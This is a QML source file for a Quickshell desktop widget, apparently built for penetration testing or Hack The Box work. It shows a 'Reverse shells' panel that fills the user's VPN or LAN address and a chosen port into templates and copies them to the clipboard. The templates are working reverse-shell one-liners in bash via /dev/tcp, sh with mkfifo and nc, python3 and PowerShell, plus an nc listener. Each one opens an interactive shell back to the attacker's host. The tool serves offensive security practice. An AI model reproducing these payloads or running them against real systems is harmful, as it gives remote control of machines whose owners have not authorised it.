import QtQuick
import QtQuick.Layouts
import Quickshell
import qs.config
import qs.services
import qs.widgets

// Reverse shells con tu LHOST (tun0) y puerto ya rellenados. Clic en una copia el comando.
ColumnLayout {
    id: root

    readonly property string lhost: SysInfo.vpnIp || SysInfo.lanIp || "LHOST"
    property string port: "4444"

    spacing: 12

    function fill(tpl) {
        return tpl.replace(/LHOST/g, root.lhost).replace(/PORT/g, root.port);
    }

    readonly property var shells: [
        { name: "Listener (nc)", tpl: "nc -lvnp PORT" },
        { name: "bash", tpl: "bash -i >& /dev/tcp/LHOST/PORT 0>&1" },
        { name: "sh (mkfifo + nc)", tpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST PORT >/tmp/f" },
        { name: "python3", tpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" },
        { name: "PowerShell", tpl: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('LHOST',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"" }
    ]

    PopHeader { code: 0xf120; title: "Reverse shells" }

    // LHOST y puerto
    RowLayout {
        Layout.fillWidth: true
        spacing: 10

        Rectangle {
            Layout.fillWidth: true
            implicitHeight: 30
            radius: Theme.radiusSmall
            color: Theme.surface2
            Row {
                anchors { left: parent.left; leftMargin: 10; verticalCenter: parent.verticalCenter }
                spacing: 6
                Label { text: "LHOST"; color: Theme.fgDim; font.pixelSize: Theme.fontSizeSmall; anchors.verticalCenter: parent.verticalCenter }
                Label { mono: true; text: root.lhost; color: SysInfo.vpnIp ? Theme.htbGreen : Theme.fg; anchors.verticalCenter: parent.verticalCenter }
            }
            MouseArea { anchors.fill: parent; cursorShape: Qt.PointingHandCursor; onClicked: Quickshell.execDetached(["wl-copy", root.lhost]) }
        }

        Rectangle {
            Layout.preferredWidth: 96
            implicitHeight: 30
            radius: Theme.radiusSmall
            color: Theme.surface2
            border.width: portInput.activeFocus ? 1 : 0
            border.color: Theme.accent
            Row {
                anchors { left: parent.left; leftMargin: 10; verticalCenter: parent.verticalCenter }
                spacing: 6
                Label { text: "LPORT"; color: Theme.fgDim; font.pixelSize: Theme.fontSizeSmall; anchors.verticalCenter: parent.verticalCenter }
                TextInput {
                    id: portInput
                    anchors.verticalCenter: parent.verticalCenter
                    width: 40
                    text: root.port
                    font.family: Theme.fontMono
                    font.pixelSize: Theme.fontSize
                    color: Theme.fg
                    selectionColor: Theme.alpha(Theme.accent, 0.35)
                    inputMethodHints: Qt.ImhDigitsOnly
                    validator: IntValidator { bottom: 1; top: 65535 }
                    onTextChanged: if (text.length > 0) root.port = text
                }
            }
        }
    }

    // Lista de comandos
    ColumnLayout {
        Layout.fillWidth: true
        spacing: 6

        Repeater {
            model: root.shells

            Rectangle {
                id: shell
                required property var modelData
                property bool copied: false

                Layout.fillWidth: true
                implicitHeight: col.implicitHeight + 16
                radius: Theme.radiusSmall
                color: shArea.containsMouse ? Theme.alpha(Theme.accent, 0.14) : Theme.surface
                Behavior on color { ColorAnimation { duration: Theme.durFast } }

                ColumnLayout {
                    id: col
                    anchors { left: parent.left; right: parent.right; verticalCenter: parent.verticalCenter; leftMargin: 12; rightMargin: 12 }
                    spacing: 2
                    RowLayout {
                        Layout.fillWidth: true
                        Label {
                            Layout.fillWidth: true
                            text: shell.modelData.name
                            color: shell.copied ? Theme.accent : Theme.fg
                            font.pixelSize: Theme.fontSizeSmall
                            font.weight: Font.DemiBold
                        }
                        Icon {
                            code: shell.copied ? 0xf00c : 0xf0c5
                            font.pixelSize: 12
                            color: shell.copied ? Theme.accent : Theme.fgDim
                        }
                    }
                    Label {
                        Layout.fillWidth: true
                        text: root.fill(shell.modelData.tpl)
                        color: Theme.fgDim
                        mono: true
                        font.pixelSize: Theme.fontSizeSmall
                        elide: Text.ElideRight
                    }
                }

                Timer { id: resetTimer; interval: 1000; onTriggered: shell.copied = false }

                MouseArea {
                    id: shArea
                    anchors.fill: parent
                    hoverEnabled: true
                    cursorShape: Qt.PointingHandCursor
                    onClicked: {
                        Quickshell.execDetached(["wl-copy", root.fill(shell.modelData.tpl)]);
                        shell.copied = true;
                        resetTimer.restart();
                    }
                }
            }
        }
    }
}
